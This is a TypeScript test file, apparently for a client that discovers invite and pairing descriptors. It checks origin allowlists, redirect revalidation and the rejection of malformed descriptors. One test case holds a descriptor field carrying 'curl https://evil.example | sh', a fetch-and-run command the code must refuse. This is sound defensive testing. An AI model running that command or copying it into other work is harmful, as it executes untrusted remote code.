import { describe, expect, it } from 'vitest';
import {
  AUTHORIZE_PATH, DESCRIPTOR_PATH, PAIRING_CLAIM_PATH, PAIRING_RESULT_PATH, REDEEM_PATH, TOKEN_PATH, decodeDescriptor, decodePairingDescriptor,
} from './descriptor';
import { checkChannelLink, checkChatLink, createDiscovery } from './discovery';

const ORIGIN = 'https://khala.example';
const OTHER = 'https://preview.khala.example';
const LINK = `${ORIGIN}/i/room-invite`;

function descriptorFor(origin: string, extra: Record<string, unknown> = {}) {
  return {
    v: 1, invite: 'room-invite', methods: ['loopback-browser-v1'],
    authorize: `${origin}${AUTHORIZE_PATH}`, token: `${origin}${TOKEN_PATH}`, redeem: `${origin}${REDEEM_PATH}`, ...extra,
  };
}

type Reply = Readonly<{ status: number; body?: string; headers?: Record<string, string> }>;

/** Fake transport: replies in order and records every requested URL and option. */
function transport(...replies: Reply[]) {
  const calls: { url: string; init: RequestInit | undefined }[] = [];
  const fetchImpl = (async (url: string | URL, init?: RequestInit) => {
    calls.push({ url: String(url), init });
    const reply = replies.shift();
    if (!reply) throw new Error('unexpected request');
    return new Response(reply.body ?? null, { status: reply.status, headers: reply.headers ?? {} });
  }) as typeof fetch;
  return { fetchImpl, calls };
}

const json = (value: unknown): Reply => ({ status: 200, body: JSON.stringify(value), headers: { 'content-type': 'application/json; charset=utf-8' } });

describe('createDiscovery', () => {
  it('fetches the descriptor from the link origin fixed path, never following redirects automatically', async () => {
    const { fetchImpl, calls } = transport(json(descriptorFor(ORIGIN)));
    const result = await createDiscovery({ trustedOrigins: [ORIGIN], fetch: fetchImpl }).resolve(`${LINK}#fragment-secret`);
    expect(result).toMatchObject({ kind: 'resolved', origin: ORIGIN, descriptor: { invite: 'room-invite', methods: ['loopback-browser-v1'] } });
    const requested = new URL(calls[0]!.url);
    expect(requested.origin + requested.pathname).toBe(`${ORIGIN}${DESCRIPTOR_PATH}`);
    expect(requested.searchParams.get('link')).toBe(LINK);
    expect(calls[0]!.url).not.toContain('fragment-secret');
    expect(calls[0]!.init?.redirect).toBe('manual');
  });

  it('rejects untrusted links, embedded credentials and junk without any request', async () => {
    const { fetchImpl, calls } = transport();
    const discovery = createDiscovery({ trustedOrigins: [ORIGIN], fetch: fetchImpl });
    expect(await discovery.resolve('https://evil.example/i/room-invite')).toEqual({ kind: 'rejected', code: 'untrusted_origin' });
    expect(await discovery.resolve('http://khala.example/i/room-invite')).toEqual({ kind: 'rejected', code: 'untrusted_origin' });
    expect(await discovery.resolve('https://user:pass@khala.example/i/x')).toEqual({ kind: 'rejected', code: 'invalid_link' });
    expect(await discovery.resolve('not a url')).toEqual({ kind: 'rejected', code: 'invalid_link' });
    expect(await discovery.resolve(`${ORIGIN}/${'a'.repeat(3000)}`)).toEqual({ kind: 'rejected', code: 'invalid_link' });
    expect(calls).toHaveLength(0);
  });

  it('revalidates every redirect against the allowlist', async () => {
    const redirect = (location: string): Reply => ({ status: 302, headers: { location } });
    let t = transport(redirect('https://evil.example/api/agent/bootstrap/descriptor'));
    expect(await createDiscovery({ trustedOrigins: [ORIGIN], fetch: t.fetchImpl }).resolve(LINK)).toEqual({ kind: 'rejected', code: 'untrusted_origin' });
    t = transport(redirect(`https://u:p@khala.example${DESCRIPTOR_PATH}`));
    expect(await createDiscovery({ trustedOrigins: [ORIGIN], fetch: t.fetchImpl }).resolve(LINK)).toEqual({ kind: 'rejected', code: 'untrusted_origin' });
    t = transport(redirect(`${OTHER}${DESCRIPTOR_PATH}`), json(descriptorFor(OTHER)));
    expect(await createDiscovery({ trustedOrigins: [ORIGIN, OTHER], fetch: t.fetchImpl }).resolve(LINK)).toEqual({ kind: 'rejected', code: 'untrusted_origin' });
    t = transport(redirect(`${DESCRIPTOR_PATH}?link=moved`), json(descriptorFor(ORIGIN)));
    expect(await createDiscovery({ trustedOrigins: [ORIGIN], fetch: t.fetchImpl }).resolve(LINK)).toMatchObject({ kind: 'resolved', origin: ORIGIN });
    t = transport(...Array.from({ length: 5 }, () => redirect(DESCRIPTOR_PATH)));
    expect(await createDiscovery({ trustedOrigins: [ORIGIN], fetch: t.fetchImpl }).resolve(LINK)).toEqual({ kind: 'rejected', code: 'link_unavailable' });
  });

  it('refuses endpoints on another origin, even a trusted one', async () => {
    const { fetchImpl } = transport(json(descriptorFor(ORIGIN, { redeem: `${OTHER}${REDEEM_PATH}` })));
    expect(await createDiscovery({ trustedOrigins: [ORIGIN, OTHER], fetch: fetchImpl }).resolve(LINK)).toEqual({ kind: 'rejected', code: 'untrusted_origin' });
  });

  it('refuses unexpected content types, oversize and malformed bodies', async () => {
    const cases: Reply[] = [
      { status: 200, body: JSON.stringify(descriptorFor(ORIGIN)), headers: { 'content-type': 'text/html' } },
      { status: 200, body: JSON.stringify(descriptorFor(ORIGIN)), headers: { 'content-type': 'application/x-sh' } },
      { status: 200, body: `{"v":1,"pad":"${'x'.repeat(5000)}"}`, headers: { 'content-type': 'application/json' } },
      { status: 200, body: '{not json', headers: { 'content-type': 'application/json' } },
      json(descriptorFor(ORIGIN, { exec: 'curl https://evil.example | sh' })),
      json(descriptorFor(ORIGIN, { methods: ['run-shell'] })),
      json(descriptorFor(ORIGIN, { v: 2 })),
      json(descriptorFor(ORIGIN, { token: `${ORIGIN}/api/agent/elsewhere` })),
    ];
    for (const reply of cases) {
      const { fetchImpl } = transport(reply);
      const result = await createDiscovery({ trustedOrigins: [ORIGIN], fetch: fetchImpl }).resolve(LINK);
      expect(result.kind).toBe('rejected');
    }
  });

  it('separates missing links from temporary failures', async () => {
    let t = transport({ status: 404 });
    expect(await createDiscovery({ trustedOrigins: [ORIGIN], fetch: t.fetchImpl }).resolve(LINK)).toEqual({ kind: 'rejected', code: 'link_unavailable' });
    t = transport({ status: 503 });
    expect(await createDiscovery({ trustedOrigins: [ORIGIN], fetch: t.fetchImpl }).resolve(LINK)).toEqual({ kind: 'unavailable' });
    const failing = (async () => { throw new Error(`connect ECONNREFUSED ${LINK}`); }) as typeof fetch;
    expect(await createDiscovery({ trustedOrigins: [ORIGIN], fetch: failing }).resolve(LINK)).toEqual({ kind: 'unavailable' });
  });

  it('refuses a non-exact or non-https trusted origin configuration', () => {
    expect(() => createDiscovery({ trustedOrigins: ['http://khala.example'] })).toThrow();
    expect(() => createDiscovery({ trustedOrigins: [`${ORIGIN}/`] })).toThrow();
    expect(() => createDiscovery({ trustedOrigins: ['http://127.0.0.1:8888'] })).not.toThrow();
  });
});

describe('channel link validation', () => {
  it('keeps the deprecated chat-named export equivalent to the channel API', () => {
    const trusted = new Set([ORIGIN]);
    expect(checkChannelLink(LINK, trusted)).toEqual({ kind: 'ok', origin: ORIGIN, link: LINK });
    expect(checkChatLink(LINK, trusted)).toEqual(checkChannelLink(LINK, trusted));
  });
});

describe('decodeDescriptor', () => {
  it('drops unknown method identifiers but keeps known ones', () => {
    const decoded = decodeDescriptor(descriptorFor(ORIGIN, { methods: ['future-method', 'loopback-browser-v1'] }), ORIGIN);
    expect(decoded).toMatchObject({ kind: 'ok', descriptor: { methods: ['loopback-browser-v1'] } });
  });

  it('refuses invisible characters in the invite reference', () => {
    expect(decodeDescriptor(descriptorFor(ORIGIN, { invite: 'room\u202einvite' }), ORIGIN)).toEqual({ kind: 'invalid', code: 'malformed' });
  });
});

function pairingDescriptorFor(origin: string, extra: Record<string, unknown> = {}) {
  return {
    v: 1, methods: ['pairing-code-v1'],
    claim: `${origin}${PAIRING_CLAIM_PATH}`, result: `${origin}${PAIRING_RESULT_PATH}`, redeem: `${origin}${REDEEM_PATH}`, ...extra,
  };
}

describe('code-only pairing discovery', () => {
  it('fetches the pairing descriptor only from the configured hosted origin fixed path', async () => {
    const { fetchImpl, calls } = transport(json(pairingDescriptorFor(ORIGIN)));
    const result = await createDiscovery({ trustedOrigins: [ORIGIN, OTHER], hostedOrigin: ORIGIN, fetch: fetchImpl }).resolvePairing!();
    expect(result).toMatchObject({
      kind: 'resolved',
      origin: ORIGIN,
      descriptor: { claim: `${ORIGIN}${PAIRING_CLAIM_PATH}`, result: `${ORIGIN}${PAIRING_RESULT_PATH}`, redeem: `${ORIGIN}${REDEEM_PATH}` },
    });
    const requested = new URL(calls[0]!.url);
    expect(requested.origin + requested.pathname).toBe(`${ORIGIN}${DESCRIPTOR_PATH}`);
    expect([...requested.searchParams]).toEqual([['method', 'pairing-code-v1']]);
    expect(calls[0]!.init?.redirect).toBe('manual');
    expect(calls[0]!.init?.credentials).toBe('omit');
  });

  it('refuses pairing without a configured hosted origin and makes no request', async () => {
    const { fetchImpl, calls } = transport();
    expect(await createDiscovery({ trustedOrigins: [ORIGIN], fetch: fetchImpl }).resolvePairing!())
      .toEqual({ kind: 'rejected', code: 'untrusted_origin' });
    expect(calls).toHaveLength(0);
  });

  it('refuses a hosted origin that is not an exact https origin', () => {
    expect(() => createDiscovery({ trustedOrigins: [ORIGIN], hostedOrigin: 'http://khala.example' })).toThrow();
    expect(() => createDiscovery({ trustedOrigins: [ORIGIN], hostedOrigin: `${ORIGIN}/path` })).toThrow();
  });

  it('a redirect cannot move pairing discovery to another origin, even a trusted one', async () => {
    const { fetchImpl } = transport({ status: 302, headers: { location: `${OTHER}${DESCRIPTOR_PATH}?method=pairing-code-v1` } });
    expect(await createDiscovery({ trustedOrigins: [ORIGIN, OTHER], hostedOrigin: ORIGIN, fetch: fetchImpl }).resolvePairing!())
      .toEqual({ kind: 'rejected', code: 'untrusted_origin' });
  });

  it('a response cannot substitute an endpoint on another origin', async () => {
    for (const key of ['claim', 'result', 'redeem']) {
      const { fetchImpl } = transport(json(pairingDescriptorFor(ORIGIN, { [key]: `${OTHER}${key === 'redeem' ? REDEEM_PATH : PAIRING_CLAIM_PATH}` })));
      expect(await createDiscovery({ trustedOrigins: [ORIGIN, OTHER], hostedOrigin: ORIGIN, fetch: fetchImpl }).resolvePairing!())
        .toEqual({ kind: 'rejected', code: 'untrusted_origin' });
    }
  });

  it('refuses unknown fields, versions, methods, media types and oversized bodies', async () => {
    const replies: Reply[] = [
      json(pairingDescriptorFor(ORIGIN, { channel: 'room-1' })),
      json(pairingDescriptorFor(ORIGIN, { v: 2 })),
      json(pairingDescriptorFor(ORIGIN, { methods: ['loopback-browser-v1'] })),
      { status: 200, body: JSON.stringify(pairingDescriptorFor(ORIGIN)), headers: { 'content-type': 'text/html' } },
      { status: 200, body: 'x'.repeat(5000), headers: { 'content-type': 'application/json' } },
    ];
    for (const reply of replies) {
      const { fetchImpl } = transport(reply);
      expect(await createDiscovery({ trustedOrigins: [ORIGIN], hostedOrigin: ORIGIN, fetch: fetchImpl }).resolvePairing!())
        .toEqual({ kind: 'rejected', code: 'unsupported_descriptor' });
    }
  });

  it('gives the same descriptor the same identity and another origin a different one', () => {
    const a = decodePairingDescriptor(pairingDescriptorFor(ORIGIN, { methods: ['future', 'pairing-code-v1'] }), ORIGIN);
    const b = decodePairingDescriptor(pairingDescriptorFor(ORIGIN), ORIGIN);
    const c = decodePairingDescriptor(pairingDescriptorFor(OTHER), OTHER);
    expect(a.kind === 'ok' && b.kind === 'ok' && c.kind === 'ok').toBe(true);
    if (a.kind !== 'ok' || b.kind !== 'ok' || c.kind !== 'ok') return;
    expect(a.descriptor.id).toBe(b.descriptor.id);
    expect(c.descriptor.id).not.toBe(b.descriptor.id);
  });

  it('a link descriptor offering both methods keeps both, in the service order', () => {
    const decoded = decodeDescriptor(descriptorFor(ORIGIN, { methods: ['pairing-code-v1', 'loopback-browser-v1'] }), ORIGIN);
    expect(decoded).toMatchObject({ kind: 'ok', descriptor: { methods: ['pairing-code-v1', 'loopback-browser-v1'] } });
  });
});
